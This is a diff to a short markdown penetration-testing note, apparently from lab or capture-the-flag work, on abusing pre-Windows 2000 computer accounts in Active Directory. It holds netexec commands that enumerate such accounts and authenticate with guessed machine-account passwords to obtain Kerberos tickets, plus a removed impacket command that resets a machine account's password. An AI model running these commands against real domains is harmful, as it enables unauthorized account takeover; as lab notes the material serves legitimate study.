@@ -7,17 +7,14 @@
 
 ### Enumeration
 ```bash
-nxc smb ip -u server$ -p server -k
-
-nxc smb ip -u server$ -p server -k --generate-tgt ticket
+nxc ldap ip -u user -p password -M pre2k
 ```
 
 ### Abusing
 ```bash
-# STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
-nxc smb 10.129.234.44 -u banking$ -p banking
+nxc smb ip -u server$ -p server -k
 
-impacket-changepasswd -p rpc-samr -newpass 'Summer2026!' retro.vl/'banking$':banking@10.129.234.44
+nxc smb ip -u server$ -p server -k --generate-tgt ticket
 ```
   
 </details>
